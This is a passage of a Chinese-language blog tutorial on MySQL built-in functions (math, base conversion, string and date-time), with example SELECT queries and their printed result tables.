<span class="keyword">set</span> (<span class="number">0.09</span> sec)</span><br></pre></td></tr></table></figure>



<h3 id="（4）指数与对数"><a href="#（4）指数与对数" class="headerlink" title="（4）指数与对数"></a>（4）指数与对数</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140009.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> POW(<span class="number">2</span>,<span class="number">5</span>),<span class="built_in">POWER</span>(<span class="number">2</span>,<span class="number">4</span>),<span class="built_in">EXP</span>(<span class="number">2</span>),<span class="built_in">LN</span>(<span class="number">10</span>),<span class="built_in">LOG10</span>(<span class="number">10</span>),LOG2(<span class="number">4</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+------------+------------------+-------------------+-----------+---------+</span></span><br><span class="line"><span class="operator">|</span> POW(<span class="number">2</span>,<span class="number">5</span>) <span class="operator">|</span> <span class="built_in">POWER</span>(<span class="number">2</span>,<span class="number">4</span>) <span class="operator">|</span> <span class="built_in">EXP</span>(<span class="number">2</span>)           <span class="operator">|</span> <span class="built_in">LN</span>(<span class="number">10</span>)            <span class="operator">|</span> <span class="built_in">LOG10</span>(<span class="number">10</span>) <span class="operator">|</span> LOG2(<span class="number">4</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+------------+------------------+-------------------+-----------+---------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">32</span> <span class="operator">|</span>         <span class="number">16</span> <span class="operator">|</span> <span class="number">7.38905609893065</span> <span class="operator">|</span> <span class="number">2.302585092994046</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span>       <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+------------+------------------+-------------------+-----------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>





<h3 id="（5）进制间的转换"><a href="#（5）进制间的转换" class="headerlink" title="（5）进制间的转换"></a>（5）进制间的转换</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140011.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> BIN(<span class="number">10</span>),HEX(<span class="number">10</span>),OCT(<span class="number">10</span>),CONV(<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+---------+--------------+</span></span><br><span class="line"><span class="operator">|</span> BIN(<span class="number">10</span>) <span class="operator">|</span> HEX(<span class="number">10</span>) <span class="operator">|</span> OCT(<span class="number">10</span>) <span class="operator">|</span> CONV(<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+---------+--------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1010</span>    <span class="operator">|</span> A       <span class="operator">|</span> <span class="number">12</span>      <span class="operator">|</span> <span class="number">2</span>            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+---------+--------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<h2 id="2-字符串函数"><a href="#2-字符串函数" class="headerlink" title="2. 字符串函数"></a>2. 字符串函数</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140013.png" alt="  "><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140016.png" alt="  "><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140338.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> ASCII(<span class="string">&#x27;Abcdfsf&#x27;</span>) a1,<span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;hello&#x27;</span>) a2, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;我们&#x27;</span>) a3,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LENGTH(<span class="string">&#x27;hello&#x27;</span>),LENGTH(<span class="string">&#x27;我们&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----+----+-----------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> a1 <span class="operator">|</span> a2 <span class="operator">|</span> a3 <span class="operator">|</span> LENGTH(<span class="string">&#x27;hello&#x27;</span>) <span class="operator">|</span> LENGTH(<span class="string">&#x27;我们&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----+----+-----------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">65</span> <span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span>               <span class="number">5</span> <span class="operator">|</span>              <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----+----+-----------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONCAT_WS(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;beijing&#x27;</span>) a1</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> a1                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> hello<span class="operator">-</span>world<span class="operator">-</span>hello<span class="operator">-</span>beijing <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;aaaaa&#x27;</span>) a1, REPLACE(<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;lol&#x27;</span>,<span class="string">&#x27;mmm&#x27;</span>) a2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------+</span></span><br><span class="line"><span class="operator">|</span> a1           <span class="operator">|</span> a2    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------+</span></span><br><span class="line"><span class="operator">|</span> haaaaaoworld <span class="operator">|</span> hello <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">UPPER</span>(<span class="string">&#x27;HelLo&#x27;</span>) a1, <span class="built_in">LOWER</span>(<span class="string">&#x27;HelLo&#x27;</span>) a2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------+</span></span><br><span class="line"><span class="operator">|</span> a1    <span class="operator">|</span> a2    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------+</span></span><br><span class="line"><span class="operator">|</span> HELLO <span class="operator">|</span> hello <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="number">2</span>) a1, <span class="keyword">RIGHT</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="number">3</span>) a2, <span class="keyword">RIGHT</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="number">13</span>) a3</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+-------+</span></span><br><span class="line"><span class="operator">|</span> a1   <span class="operator">|</span> a2   <span class="operator">|</span> a3    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+-------+</span></span><br><span class="line"><span class="operator">|</span> he   <span class="operator">|</span> llo  <span class="operator">|</span> hello <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CONCAT(<span class="string">&#x27;---&#x27;</span>,LTRIM(<span class="string">&#x27;    h  el  lo   &#x27;</span>),<span class="string">&#x27;***&#x27;</span>) a1,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">TRIM</span>(<span class="string">&#x27;oo&#x27;</span> <span class="keyword">FROM</span> <span class="string">&#x27;ooheollo&#x27;</span>) a2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------+</span></span><br><span class="line"><span class="operator">|</span> a1                 <span class="operator">|</span> a2     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="comment">---h  el  lo   *** | heollo |</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> REPEAT(<span class="string">&#x27;hello&#x27;</span>,<span class="number">4</span>) a1, LENGTH(SPACE(<span class="number">5</span>)),STRCMP(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;abe&#x27;</span>) a2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+------------------+----+</span></span><br><span class="line"><span class="operator">|</span> a1                   <span class="operator">|</span> LENGTH(SPACE(<span class="number">5</span>)) <span class="operator">|</span> a2 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+------------------+----+</span></span><br><span class="line"><span class="operator">|</span> hellohellohellohello <span class="operator">|</span>                <span class="number">5</span> <span class="operator">|</span> <span class="number">-1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+------------------+----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;hello&#x27;</span>,<span class="number">2</span>,<span class="number">2</span>) a1, LOCATE(<span class="string">&#x27;lll&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>) a2</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----+</span></span><br><span class="line"><span class="operator">|</span> a1   <span class="operator">|</span> a2 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----+</span></span><br><span class="line"><span class="operator">|</span> el   <span class="operator">|</span>  <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> ELT(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>) a1, FIELD(<span class="string">&#x27;mm&#x27;</span>,<span class="string">&#x27;gg&#x27;</span>,<span class="string">&#x27;jj&#x27;</span>,<span class="string">&#x27;mm&#x27;</span>,<span class="string">&#x27;dd&#x27;</span>,<span class="string">&#x27;mm&#x27;</span>) a2,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> FIND_IN_SET(<span class="string">&#x27;mm&#x27;</span>,<span class="string">&#x27;gg,mm,jj,dd,mm,gg&#x27;</span>) a3</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----+----+</span></span><br><span class="line"><span class="operator">|</span> a1   <span class="operator">|</span> a2 <span class="operator">|</span> a3 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----+----+</span></span><br><span class="line"><span class="operator">|</span> b    <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----+----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>




<h2 id="3-日期和时间函数"><a href="#3-日期和时间函数" class="headerlink" title="3. 日期和时间函数"></a>3. 日期和时间函数</h2><h3 id="（1）获取日期、时间"><a href="#（1）获取日期、时间" class="headerlink" title="（1）获取日期、时间"></a>（1）获取日期、时间</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140026.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 获取日期、时间</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CURDATE(),<span class="built_in">CURRENT_DATE</span>(),CURTIME(),NOW(),SYSDATE(),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> UTC_DATE(),UTC_TIME()</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------------+-----------+---------------------+---------------------+------------+------------+</span></span><br><span class="line"><span class="operator">|</span> CURDATE()  <span class="operator">|</span> <span class="built_in">CURRENT_DATE</span>() <span class="operator">|</span> CURTIME() <span class="operator">|</span> NOW()               <span class="operator">|</span> SYSDATE()           <span class="operator">|</span> UTC_DATE() <span class="operator">|</span> UTC_TIME() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------------+-----------+---------------------+---------------------+------------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span>     <span class="operator">|</span> <span class="number">21</span>:<span class="number">33</span>:<span class="number">07</span>  <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">33</span>:<span class="number">07</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">33</span>:<span class="number">07</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="operator">|</span> <span class="number">13</span>:<span class="number">33</span>:<span class="number">07</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------------+-----------+---------------------+---------------------+------------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> CURDATE(),CURDATE() <span class="operator">+</span> <span class="number">0</span>,CURTIME() <span class="operator">+</span> <span class="number">0</span>,NOW() <span class="operator">+</span> <span class="number">0</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+---------------+---------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> CURDATE()  <span class="operator">|</span> CURDATE() <span class="operator">+</span> <span class="number">0</span> <span class="operator">|</span> CURTIME() <span class="operator">+</span> <span class="number">0</span> <span class="operator">|</span> NOW() <span class="operator">+</span> <span class="number">0</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+---------------+---------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="operator">|</span>      <span class="number">20221019</span> <span class="operator">|</span>        <span class="number">213310</span> <span class="operator">|</span> <span class="number">20221019213310</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+---------------+---------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（2）日期与时间戳的转换"><a href="#（2）日期与时间戳的转换" class="headerlink" title="（2）日期与时间戳的转换"></a>（2）日期与时间戳的转换</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140028.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 日期与时间戳的转换</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UNIX_TIMESTAMP(now());</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> UNIX_TIMESTAMP(now()) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1576380910</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UNIX_TIMESTAMP(CURDATE());</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> UNIX_TIMESTAMP(CURDATE()) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1576339200</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UNIX_TIMESTAMP(CURTIME());</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> UNIX_TIMESTAMP(CURTIME()) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1576380969</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UNIX_TIMESTAMP(<span class="string">&#x27;2011-11-11 11:11:11&#x27;</span>)</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> UNIX_TIMESTAMP(<span class="string">&#x27;2011-11-11 11:11:11&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1320981071</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="（3）获取月份、星期、星期数、天数等"><a href="#（3）获取月份、星期、星期数、天数等" class="headerlink" title="（3）获取月份、星期、星期数、天数等"></a>（3）获取月份、星期、星期数、天数等</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140030.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 获取月份、星期、星期数、天数等函数</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">YEAR</span>(CURDATE()),<span class="keyword">MONTH</span>(CURDATE()),<span class="keyword">DAY</span>(CURDATE()),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HOUR</span>(CURTIME()),<span class="keyword">MINUTE</span>(NOW()),<span class="keyword">SECOND</span>(SYSDATE())</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+------------------+----------------+-----------------+---------------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">YEAR</span>(CURDATE()) <span class="operator">|</span> <span class="keyword">MONTH</span>(CURDATE()) <span class="operator">|</span> <span class="keyword">DAY</span>(CURDATE()) <span class="operator">|</span> <span class="keyword">HOUR</span>(CURTIME()) <span class="operator">|</span> <span class="keyword">MINUTE</span>(NOW()) <span class="operator">|</span> <span class="keyword">SECOND</span>(SYSDATE()) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+------------------+----------------+-----------------+---------------+-------------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">2022</span> <span class="operator">|</span>               <span class="number">10</span> <span class="operator">|</span>             <span class="number">19</span> <span class="operator">|</span>              <span class="number">21</span> <span class="operator">|</span>            <span class="number">37</span> <span class="operator">|</span>                <span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+------------------+----------------+-----------------+---------------+-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.32</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> MONTHNAME(<span class="string">&#x27;2021-10-26&#x27;</span>),DAYNAME(<span class="string">&#x27;2021-10-26&#x27;</span>),WEEKDAY(<span class="string">&#x27;2021-10-26&#x27;</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> QUARTER(CURDATE()),WEEK(CURDATE()),DAYOFYEAR(NOW()),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DAYOFMONTH(NOW()),DAYOFWEEK(NOW())</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+-----------------------+-----------------------+--------------------+-----------------+------------------+-------------------+------------------+</span></span><br><span class="line"><span class="operator">|</span> MONTHNAME(<span class="string">&#x27;2021-10-26&#x27;</span>) <span class="operator">|</span> DAYNAME(<span class="string">&#x27;2021-10-26&#x27;</span>) <span class="operator">|</span> WEEKDAY(<span class="string">&#x27;2021-10-26&#x27;</span>) <span class="operator">|</span> QUARTER(CURDATE()) <span class="operator">|</span> WEEK(CURDATE()) <span class="operator">|</span> DAYOFYEAR(NOW()) <span class="operator">|</span> DAYOFMONTH(NOW()) <span class="operator">|</span> DAYOFWEEK(NOW()) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+-----------------------+-----------------------+--------------------+-----------------+------------------+-------------------+------------------+</span></span><br><span class="line"><span class="operator">|</span> October                 <span class="operator">|</span> Tuesday               <span class="operator">|</span>                     <span class="number">1</span> <span class="operator">|</span>                  <span class="number">4</span> <span class="operator">|</span>              <span class="number">42</span> <span class="operator">|</span>              <span class="number">292</span> <span class="operator">|</span></span><br><span class="line">      <span class="number">19</span> <span class="operator">|</span>                <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+-----------------------+-----------------------+--------------------+-----------------+------------------+-------------------+------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.11</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（4）日期的操作函数"><a href="#（4）日期的操作函数" class="headerlink" title="（4）日期的操作函数"></a>（4）日期的操作函数</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140037.png" alt="  "></p>
<p><strong>EXTRACT(type FROM date)函数中type的取值与含义</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140035.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 日期的操作函数</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">EXTRACT</span>(<span class="keyword">SECOND</span> <span class="keyword">FROM</span> NOW()),<span class="built_in">EXTRACT</span>(<span class="keyword">DAY</span> <span class="keyword">FROM</span> NOW()),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="built_in">EXTRACT</span>(HOUR_MINUTE <span class="keyword">FROM</span> NOW()),<span class="built_in">EXTRACT</span>(QUARTER <span class="keyword">FROM</span> <span class="string">&#x27;2021-05-12&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+-------------------------+---------------------------------+------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">EXTRACT</span>(<span class="keyword">SECOND</span> <span class="keyword">FROM</span> NOW()) <span class="operator">|</span> <span class="built_in">EXTRACT</span>(<span class="keyword">DAY</span> <span class="keyword">FROM</span> NOW()) <span class="operator">|</span> <span class="built_in">EXTRACT</span>(HOUR_MINUTE <span class="keyword">FROM</span> NOW()) <span class="operator">|</span> <span class="built_in">EXTRACT</span>(QUARTER <span class="keyword">FROM</span> <span class="string">&#x27;2021-05-12&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+-------------------------+---------------------------------+------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                         <span class="number">12</span> <span class="operator">|</span>                      <span class="number">19</span> <span class="operator">|</span>                            <span class="number">2138</span> <span class="operator">|</span>                                  <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+-------------------------+---------------------------------+------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h3 id="（5）时间和秒钟转换的函数"><a href="#（5）时间和秒钟转换的函数" class="headerlink" title="（5）时间和秒钟转换的函数"></a>（5）时间和秒钟转换的函数</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140039.png" alt="  "></p>
